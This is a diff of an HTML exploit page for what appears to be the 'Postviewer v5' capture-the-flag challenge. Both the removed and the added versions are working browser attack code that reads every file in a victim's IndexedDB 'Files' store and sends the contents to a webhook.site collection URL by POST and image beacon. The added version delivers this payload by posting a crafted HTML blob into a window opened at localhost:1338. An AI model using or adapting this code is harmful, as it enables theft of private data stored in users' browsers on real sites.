@@ -1,295 +1,35 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width,initial-scale=1"/>
-  <title>Postviewer v5 - robust flag extractor</title>
-  <style>
-    body{font-family:system-ui,Arial;padding:16px}
-    pre{background:#f6f6f6;padding:12px;border-radius:8px;white-space:pre-wrap}
-    button{padding:8px 12px;margin-top:10px}
-    .ok{color:green}
-    .warn{color:darkorange}
-  </style>
-</head>
-<body>
-  <h3>postviewer extractor (robust)</h3>
-  <div><strong>URL:</strong> <span id="url"></span></div>
-  <div id="status"><pre>starting...</pre></div>
-  <button id="run">Run now</button>
+  <head>
+    <meta charset="utf-8" />
+    <title>Postviewer v5 exploit</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+  </head>
+  <body>
+    <h2>Launching exploit…</h2>
+    <p>
+      This page will automatically attempt to retrieve the admin’s flag from the
+      Postviewer v5 instance.
+    </p>
+    <script>
+      (async function () {
+        const EXFIL_URL =
+          "https://webhook.site/90a00c64-2bf3-4683-ab13-2e3070d96349";
+        const innerPayload = `<!doctype html><html><body><script>\n(async function() {\n  try {\n    const EXFIL='${EXFIL_URL}';\n    const openReq = indexedDB.open('Files', 1);\n    const db = await new Promise(resolve => { openReq.onsuccess = () => resolve(openReq.result); });\n    const tx = db.transaction('files', 'readonly').objectStore('files').getAll();\n    const records = await new Promise(resolve => { tx.onsuccess = () => resolve(tx.result); });\n    for (const rec of records) {\n      const file = rec.file;\n      const reader = new FileReader();\n      reader.onload = function() {\n       \n        try {\n          fetch(EXFIL, {method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain'}, body: reader.result});\n        } catch (e) {\n         \n          const i = new Image();\n          i.src = EXFIL + '/?data=' + encodeURIComponent(reader.result.substring(0,1024));\n        }\n      };\n      reader.readAsText(file);\n    }\n  } catch (err) {\n    console.error('exfiltration failed', err);\n  }\n})();\n<\/script></body></html>`;
 
-<script>
-const LOG = (s, level) => {
-  const p = document.querySelector('#status pre');
-  const time = new Date().toISOString().split('T')[1].slice(0,12);
-  p.textContent += `\n[${time}] ${s}`;
-  console.debug(s);
-  if (level==='ok') p.textContent += ' ✅';
-};
-const WARN = (s) => LOG(s,'warn');
+        const payloadBlob = new Blob([innerPayload], { type: "text/html" });
 
-document.getElementById('url').innerText = location.href;
+        const exploitFile = {
+          blob: payloadBlob,
+          name: "exploit.html",
+          cached: false,
+        };
+        const targetWindow = window.open("http://localhost:1338/", "_blank");
 
-// replace this with your webhook if you changed it
-const EXFIL_URL = "https://webhook.site/90a00c64-2bf3-4683-ab13-2e3070d96349";
+        await new Promise((res) => setTimeout(res, 4000));
 
-function postNoCors(payload) {
-  // best-effort POST that will be sent by sandboxed/headless browsers
-  try {
-    fetch(EXFIL_URL, {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify(payload)
-    });
-    LOG('POST (no-cors) attempted to webhook');
-  } catch (e) {
-    WARN('POST attempt threw: ' + e);
-  }
-}
-
-// fallback small beacon using image (may be truncated)
-function beacon(payload) {
-  try {
-    const q = encodeURIComponent(JSON.stringify(payload)).slice(0, 1800);
-    const img = new Image();
-    img.src = EXFIL_URL + '/?p=' + q;
-    // keep reference so it's not GC'd immediately in some environments
-    (window.__beacons = window.__beacons || []).push(img);
-    LOG('Beacon image fired (may be truncated)');
-  } catch (e) {
-    WARN('Beacon failed: ' + e);
-  }
-}
-
-async function readBlob(blob) {
-  // try modern API
-  try {
-    if (blob.text) {
-      const t = await blob.text();
-      return {text: t, binary: false};
-    }
-  } catch (e) {
-    // ignore and fallback
-  }
-  // FileReader fallback for text
-  try {
-    const t = await new Promise((res, rej) => {
-      const fr = new FileReader();
-      fr.onload = () => res(String(fr.result));
-      fr.onerror = () => rej(fr.error);
-      fr.readAsText(blob);
-    });
-    return {text: t, binary: false};
-  } catch (e) {
-    // final fallback: base64 binary
-  }
-  try {
-    const ab = await blob.arrayBuffer();
-    const u8 = new Uint8Array(ab);
-    let s = '';
-    const chunk = 0x8000;
-    for (let i = 0; i < u8.length; i += chunk) {
-      s += String.fromCharCode.apply(null, u8.subarray(i, i + chunk));
-    }
-    const b64 = btoa(s);
-    return {text: b64, binary: true};
-  } catch (e) {
-    return {text: '[unreadable blob]', binary: false};
-  }
-}
-
-function openFilesDB() {
-  return new Promise((resolve, reject) => {
-    const req = indexedDB.open('Files');
-    req.onerror = () => reject(new Error('indexedDB open failed'));
-    req.onsuccess = () => resolve(req.result);
-    req.onblocked = () => WARN('indexedDB blocked');
-    // no onupgradeneeded changes: if upgrade needed, pages likely older/newer
-  });
-}
-
-function getFragmentId() {
-  const h = location.hash || '';
-  if (h.startsWith('#file-')) return h.slice(6);
-  return null;
-}
-
-function iterateStoreAll(db, storeName, onItem) {
-  return new Promise((resolve, reject) => {
-    try {
-      const tx = db.transaction(storeName, 'readonly');
-      const store = tx.objectStore(storeName);
-      const req = store.openCursor();
-      req.onerror = () => reject(req.error);
-      req.onsuccess = (ev) => {
-        const cur = ev.target.result;
-        if (!cur) {
-          resolve();
-          return;
-        }
-        onItem(cur.value);
-        cur.continue();
-      };
-    } catch (e) {
-      reject(e);
-    }
-  });
-}
-
-async function tryReadFilesStore(db) {
-  if (!db.objectStoreNames.contains('files')) {
-    WARN("No 'files' store present.");
-    return false;
-  }
-  LOG("Reading all entries from 'files' store...");
-  let found = false;
-  await iterateStoreAll(db, 'files', async (rec) => {
-    try {
-      // rec likely = { id, file, cached, isPublic }
-      const id = rec.id || rec.key || '[no-id]';
-      const fileObj = rec.file || rec.fileObj || rec.value || null;
-      // Some storage variants may wrap file differently; try to find a Blob/File
-      const blob = (fileObj instanceof Blob) ? fileObj
-                 : (fileObj && fileObj.file) ? fileObj.file
-                 : (fileObj && typeof fileObj === 'object' && fileObj.name && (fileObj.size !== undefined)) ? fileObj
-                 : null;
-      const name = (fileObj && fileObj.name) || rec.name || (rec.file && rec.file.name) || 'unknown';
-      LOG(`Found record id=${id} name=${name}`);
-      if (!blob) {
-        LOG('No blob found on this record; skipping.');
-        return;
-      }
-      const {text, binary} = await readBlob(blob);
-      LOG(`Read blob (len=${text ? text.length : 0}) for id=${id}`);
-      // exfiltrate result
-      postNoCors({source:'ctf-extractor', method:'files-iter', id, name, binary, content: text});
-      beacon({source:'ctf-extractor', method:'files-iter', id, name, binary, contentPrefix: (text||'').slice(0,1200)});
-      found = true;
-    } catch (e) {
-      WARN('Error reading a record: ' + e);
-    }
-  });
-  return found;
-}
-
-async function tryReadInfoThenFiles(db) {
-  // If info exists, prefer using it to get name+id then fetch files store for that id.
-  if (!db.objectStoreNames.contains('info')) {
-    LOG("No 'info' store present; will read 'files' directly.");
-    return false;
-  }
-  LOG("Scanning 'info' store for entries...");
-  let candidateId = null;
-  await iterateStoreAll(db, 'info', (infoRec) => {
-    // infoRec looks like {id, name, cached, isPublic, date}
-    if (!candidateId && infoRec && infoRec.name && infoRec.name.toLowerCase().includes('flag')) {
-      candidateId = infoRec.id;
-    }
-  });
-  if (!candidateId) {
-    LOG("No explicit 'flag' entry found in info; will fallback to reading files store.");
-    return false;
-  }
-  LOG("Found candidate in info store: id=" + candidateId);
-  // fetch from files store
-  try {
-    const tx = db.transaction('files', 'readonly');
-    const recReq = tx.objectStore('files').get(candidateId);
-    const rec = await new Promise((res, rej) => { recReq.onsuccess = () => res(recReq.result); recReq.onerror = () => rej(recReq.error); });
-    if (rec && rec.file) {
-      const blob = rec.file;
-      const name = rec.file.name || 'flag.txt';
-      const {text,binary} = await readBlob(blob);
-      postNoCors({source:'ctf-extractor', method:'info->files', id:candidateId, name, binary, content: text});
-      beacon({source:'ctf-extractor', method:'info->files', id:candidateId, name, binary, contentPrefix: (text||'').slice(0,1200)});
-      LOG("Exfiltrated candidate from info->files: " + candidateId);
-      return true;
-    } else {
-      LOG("Info entry found but no matching files record.");
-      return false;
-    }
-  } catch (e) {
-    WARN("Error fetching files record for id from info: " + e);
-    return false;
-  }
-}
-
-async function mainRun() {
-  try {
-    const db = await openFilesDB();
-    LOG("Opened IndexedDB 'Files'. Object stores: " + Array.from(db.objectStoreNames).join(', '));
-    // try fragment id first
-    const frag = getFragmentId();
-    if (frag) {
-      LOG("Fragment id present: " + frag + " -> trying direct fetch from files store.");
-      try {
-        if (db.objectStoreNames.contains('files')) {
-          const rec = await new Promise((res, rej) => {
-            const tx = db.transaction('files','readonly');
-            const req = tx.objectStore('files').get(frag);
-            req.onsuccess = () => res(req.result);
-            req.onerror = () => rej(req.error);
-          });
-          if (rec && rec.file) {
-            LOG("Found record for fragment id: reading blob...");
-            const {text,binary} = await readBlob(rec.file);
-            postNoCors({source:'ctf-extractor', method:'fragment-id', id:frag, name: rec.file.name || 'flag.txt', binary, content: text});
-            beacon({source:'ctf-extractor', method:'fragment-id', id:frag, name: rec.file.name || 'flag.txt', binary, contentPrefix: (text||'').slice(0,1200)});
-            LOG("Exfiltrated fragment id result.");
-            return true;
-          } else {
-            LOG("No entry for fragment id in files store.");
-          }
-        } else {
-          LOG("Files store missing; cannot fetch fragment id directly.");
-        }
-      } catch (e) {
-        WARN("Error handling fragment id: " + e);
-      }
-    } else {
-      LOG("No fragment id found in URL.");
-    }
-
-    // prefer info->files where possible
-    const fromInfo = await tryReadInfoThenFiles(db);
-    if (fromInfo) return true;
-
-    // else iterate all files entries
-    const foundAny = await tryReadFilesStore(db);
-    if (foundAny) return true;
-
-    // retry for a short window (bot might write just before visiting)
-    LOG("Nothing found yet; will retry for up to 120s...");
-    const start = Date.now();
-    while (Date.now() - start < 120000) {
-      await new Promise(r => setTimeout(r, 2000));
-      // re-open DB to pick up changes
-      try {
-        const db2 = await openFilesDB();
-        if (db2.objectStoreNames.contains('info')) {
-          const ok = await tryReadInfoThenFiles(db2);
-          if (ok) return true;
-        }
-        const ok2 = await tryReadFilesStore(db2);
-        if (ok2) return true;
-      } catch (e) {
-        WARN('Retry loop error: ' + e);
-      }
-    }
-    LOG("Timeout: no flag discovered in DB within retry window.");
-    postNoCors({source:'ctf-extractor', status:'timeout', url: location.href});
-    return false;
-  } catch (e) {
-    WARN("Fatal: " + e);
-    postNoCors({source:'ctf-extractor', status:'error', error: String(e)});
-    beacon({source:'ctf-extractor', status:'error', error: String(e)});
-    return false;
-  }
-}
-
-document.getElementById('run').addEventListener('click', () => { mainRun(); });
-setTimeout(() => { mainRun(); }, 600);
-</script>
-</body>
+        targetWindow.postMessage({ type: "share", files: [exploitFile] }, "*");
+      })();
+    </script>
+  </body>
 </html>
